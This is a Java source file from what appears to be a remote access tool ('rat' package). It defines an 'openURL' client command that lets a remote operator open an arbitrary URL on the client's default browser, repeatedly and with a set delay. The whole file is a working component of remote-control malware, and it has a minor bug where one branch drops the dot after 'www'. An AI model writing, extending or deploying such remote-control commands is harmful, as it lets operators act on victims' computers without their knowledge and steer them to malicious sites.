package main.java.rat.command.clientCommands;

import main.java.rat.command.ClientCommand;
import main.java.rat.command.IntegerCommandParameter;
import main.java.rat.command.StringCommandParameter;

import java.awt.*;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;

public class ClientOpenURLCommand extends ClientCommand {
    public ClientOpenURLCommand() {
        this.parameters.add(
                new StringCommandParameter("URL", true, "The URL of the website to launch")
        );
        this.parameters.add(
                new IntegerCommandParameter("count", false, "The amount of times to open the URL", 1)
        );
        this.parameters.add(
                new IntegerCommandParameter("delay", false, "Delay before every launch in milliseconds", 0)
        );
    }

    @Override
    public String getMainCommandName() {
        return "openURL";
    }

    @Override
    public String getHelpText() {
        return "Open the given url X times on the client's browser";
    }

    @Override
    public String getExtendedHelpText() {
        return "Open the given url X times with the client's current default browser with a given delay between";
    }

    @Override
    public boolean executeCommand() {

        String givenURL = (String) getParameter("URL").getValue();
        int count = (int) getParameter("count").getValue();
        int delay = (int) getParameter("delay").getValue();

        if(!isValidURI(givenURL)) {
            error = "Invalid URL given";
            return false;
        }

        if(!isValidURL(givenURL)) {
           if(isValidURL("http://"+givenURL)) {
               givenURL = "http://"+givenURL;
           } else if(isValidURL("http://www."+givenURL)) {
               givenURL = "http://www"+givenURL;
           } else if(isValidURL("www."+givenURL)) {
               givenURL = "www."+givenURL;
           } else {
               error = "Invalid URL given";
               return false;
           }
        }

        try {
            logger.log("Opening '"+givenURL+"' "+count+" time(s)");
            for(int i = 0; i < count; i++) {
                Desktop.getDesktop().browse(new URI(givenURL));
                try {
                    Thread.sleep(delay);
                } catch (InterruptedException e) {
                    this.error = "Unexpected InterruptedException occurred";
                    return false;
                }
            }
            return true;
        } catch (Exception e) {
            //TODO: send error feedback to server
            this.error = "Java.awt.Desktop is not supported on this client";
        }
        return false;
    }

    private boolean isValidURI(String url) {
        try {
            (new URI(url)).parseServerAuthority();
            return true;
        } catch (URISyntaxException e) {
            return false;
        }
    }

    private boolean isValidURL(String url) {
        try {
            new URL(url);
            return true;
        } catch (MalformedURLException e) {
            return false;
        }
    }
}
